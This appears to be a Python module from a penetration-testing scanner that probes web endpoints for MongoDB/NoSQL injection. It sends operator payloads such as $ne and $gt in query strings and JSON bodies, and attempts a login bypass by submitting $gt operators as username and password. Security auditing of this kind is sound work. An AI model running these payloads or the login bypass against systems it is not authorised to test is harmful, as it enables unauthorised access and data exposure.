from scan_engine.helpers.http_client import get_session
import json
import time

class NoSQLScanner:
    """
    Expert Auditor for NoSQL Injection (MongoDB, etc.).
    Focuses on JSON body and query parameter manipulation.
    """
    def __init__(self, options=None):
        self.options = options
        self.session = get_session(self.options)
        self.session.headers.update({"User-Agent": "RedOps3-NoSQLExpert/1.0", "Content-Type": "application/json"})
        
        # Payloads for MongoDB/JSON based injections
        self.payloads = [
            {"$gt": ""},          # Greater than
            {"$ne": "random_val"},# Not equal (classic for bypass)
            {"$regex": ".*"},     # Regex match
            {"$where": "sleep(2000)"} # Time-based (less common now in strict envs)
        ]

    def scan_endpoint(self, url, params, logger=None):
        findings = []
        if logger: logger(f"NoSQL Expert: Auditing {url} for NoSQL Injection (Differential Analysis)...", "INFO")

        for param in params:
            try:
                # 0. Baseline Analysis
                orig = self.session.get(url, params={param: "random_test_safe_123"}, timeout=5)
                baseline_text = orig.text if orig.status_code == 200 else ""
                
                # 1. Behavioral Check: Logical Bypass ($ne)
                qs_payload = {f"{param}[$ne]": "totally_non_existent_key_xyz_999"}
                nosql_qs = self.session.get(url, params=qs_payload, timeout=5)
                
                # Validation: 
                # 1. Status code is 200
                # 2. Response text is DIFFERENT from baseline (proves the operator was parsed)
                # 3. Look for "id", "user", "email" or JSON success markers that weren't in baseline
                if nosql_qs.status_code == 200 and nosql_qs.text != baseline_text:
                    confidence = "medium"
                    # If we see typical JSON success markers that weren't in the baseline, increase confidence
                    interesting_keys = ['"id":', '"_id":', '"email":', '"username":']
                    hit = False
                    for k in interesting_keys:
                        if k in nosql_qs.text and k not in baseline_text:
                            hit = True
                            confidence = "high"
                            break

                    if hit or (len(nosql_qs.text) > len(baseline_text) + 50): # Significant data leak
                        findings.append({
                            "title": "NoSQL Injection (MongoDB Operator Parsing)",
                            "description": f"The application appears to parse MongoDB operators via Query String.\nParameter: {param}\nConfirmed via differential response analysis.",
                            "severity": "high",
                            "confidence": confidence,
                            "tool_source": "nosql_expert",
                            "url": url,
                            "payload": str(qs_payload)
                        })

                # 2. JSON Body Injection (if applicable)
                json_payload = {param: {"$ne": "non_existent_999"}}
                nosql_json = self.session.post(url, json=json_payload, timeout=5)
                
                if nosql_json.status_code == 200 and nosql_json.text != baseline_text:
                    if '"id":' in nosql_json.text or '"_id":' in nosql_json.text:
                        findings.append({
                            "title": "Critical NoSQL Injection (JSON Body)",
                            "description": f"Confirmed NoSQL injection in JSON body.\nParameter: {param}\nPayload: {json_payload}",
                            "severity": "critical",
                            "confidence": "high",
                            "tool_source": "nosql_expert",
                            "url": url
                        })

            except Exception as e:
                pass
        
        return findings

    def scan_login(self, login_url, user_param="username", pass_param="password", logger=None):
        findings = []
        try:
            # Classic login bypass payload
            payload = {
                user_param: {"$gt": ""},
                pass_param: {"$gt": ""}
            }
            resp = self.session.post(login_url, json=payload, timeout=5)
            
            # If we get a 200 or 302 and we didn't provide a valid password
            if resp.status_code in [200, 302] and len(resp.text) > 0:
                # Check if we were redirected to a dashboard or got a session cookie
                if any(k in resp.url.lower() for k in ["dashboard", "home", "profile", "account"]) or "session" in str(resp.cookies).lower():
                    findings.append({
                        "title": "NoSQL Login Bypass (CRITICAL)",
                        "description": f"Successfully bypassed login at {login_url} using MongoDB $gt operators.",
                        "severity": "critical",
                        "tool_source": "nosql_expert",
                        "url": login_url
                    })
                    if logger: logger(f"CRITICAL: NoSQL Login Bypass confirmed on {login_url}", "CRITICAL")
        except Exception:
            pass
        return findings
